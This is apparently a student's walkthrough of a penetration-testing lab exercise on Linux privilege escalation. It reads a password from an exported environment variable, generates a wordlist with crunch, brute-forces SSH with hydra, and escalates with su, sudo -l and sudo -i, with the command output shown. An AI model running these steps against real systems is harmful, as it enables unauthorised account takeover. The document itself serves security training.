Questions 1
Connect to the VM 1 and repeat the steps learned in this section. Which command is used to list sudoer capabilities for a given user?

ssh joe@192.168.214.214
# Lets view its env 
...
SHELL=/bin/bash
PWD=/home/joe
LOGNAME=joe
XDG_SESSION_TYPE=tty
HOME=/home/joe
...
SCRIPT_CREDENTIALS=lab
USER=joe
...

# SCRIPT_CREDENTIALS variable holds a value that resembles a password. To confirm that we are dealing with a permanent variable, we need to inspect the .bashrc configuration file.

cat .bashrc
...
export SCRIPT_CREDENTIALS="lab"
...
# From the above listing, we can confirm that the variable holding the password is exported when a user's shell is launched.

# Change to the root user 
su - root
Password: lab

# Successfully obtaining root privileges

# There is another methods of privilege escalation route instead based on environment variable credentials findings which is brute force

# Prepare the wordlist 
crunch 6 6 -t Lab%%% > wordlist

# Since an SSH server is available on our target machine, we can try to attempt a remote brute force attack via Hydra. We'll supply the target username with the -l parameter, our wordlist with -P, the target IP address, and finally ssh as the target protocol. We will also include -V to increase verbosity.

hydra -l eve -P wordlist 192.168.214.214 -t 4 ssh -V        
...
[22][ssh] host: 192.168.214.214   login: eve   password: Lab123
...

# Hydra brute forcing succeeded and now we can try the login 
ssh eve@192.168.214.214
Pasword: lab123

# We can verify if we're running as a privileged users by listing the sudo capabilities using sudo -l command
sudo -l 

# Eve seems to be an administrative account, we can elevcate directly to the root user running i with sudo
sudo -i
